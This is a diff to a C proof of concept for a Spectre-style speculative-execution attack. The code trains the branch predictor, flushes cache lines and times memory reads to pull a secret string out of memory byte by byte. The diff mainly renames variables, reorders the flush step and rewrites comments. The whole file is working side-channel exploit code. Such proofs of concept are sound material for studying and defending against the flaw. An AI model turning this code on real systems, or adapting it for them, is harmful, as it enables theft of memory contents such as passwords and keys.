@@ -140,28 +140,22 @@ int *checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num
     for (i = 0; i < 256; i++) results[i] = 0;
 
     while (num_tries-- > 0) {
-
-        /* Flush array2 */
-        for (i = 0; i < 256; i++)
-            flush(&array2[i * 512]);
-        wait();
-
         /* Training the Branch Prediction of the victim code */
         for (i = 10; i >= 0; i--)
             flushAndCall(num_tries % array1_size);
         wait();
 
-        /* Forget about trainingAddress */
+        /* flush array2 */
         for (i = 0; i < 256; i++)
             flush(&array2[i * 512]);
         wait();
 
-        /* Calling victim code so it loads data to cache */
+        /* Calling victim code with relative address to load secret data */
         flushAndCall(relativeAddress);
 
-        /* Time reads. Order is lightly mixed up to prevent stride prediction */
         for (i = 0; i < 256; i++) {
-            temp = ((i * 167) + 13) & 255;
+            /* out of order index to prevent perfecting */
+            temp = (i * 167) & 255;
             if (memaccesstime(&array2[temp * 512]) < cacheHitThreshold) {
                 results[temp]++;
             }
@@ -185,13 +179,14 @@ int main() {
     const int maxStringSize = 1000;
 
     int index = 0;
-    int *probableValue;
+    int *mostProbableValue;
     char foundSecret[maxStringSize];
-
     const int cacheHitThreshold = getCacheHitThresholdTime(10000, true);
+
+    /* Relative address of secret to array1 */
     size_t secretRelativeAddress = ((size_t) secret) - ((size_t) array1);
 
-    /* write to array2 so in RAM not copy-on-write zero pages */
+    /* allocate array2 in RAM */
     for (int i = 0; i < (int) sizeof(array2); i++) array2[i] = 0;
 
     printf("\n");
@@ -200,17 +195,16 @@ int main() {
     while (true) {
         if (index > maxStringSize) break;
 
-        probableValue = checkRelativeAddress(cacheHitThreshold, secretRelativeAddress, num_tries);
-        foundSecret[index] = (char) probableValue[0];
+        mostProbableValue = checkRelativeAddress(cacheHitThreshold, secretRelativeAddress + index, num_tries);
+        foundSecret[index] = (char) mostProbableValue[0];
         foundSecret[index + 1] = '\0';
         if (foundSecret[index] == '\0') break;
 
-        printf("Speculatively accessed virtual address: %p ", (void *) secretRelativeAddress);
-        printf("Got secret: %3d = '%c' ", probableValue[0], foundSecret[index]);
-        printf("Success Rate: %4d/%d", probableValue[1], num_tries);
+        printf("Speculatively accessed virtual address: %p ", (void *) (secretRelativeAddress + index));
+        printf("Got secret: %3d = '%c' ", mostProbableValue[0], foundSecret[index]);
+        printf("Success Rate: %4d/%d", mostProbableValue[1], num_tries);
         printf("\n");
 
-        secretRelativeAddress++;
         index++;
     }
 
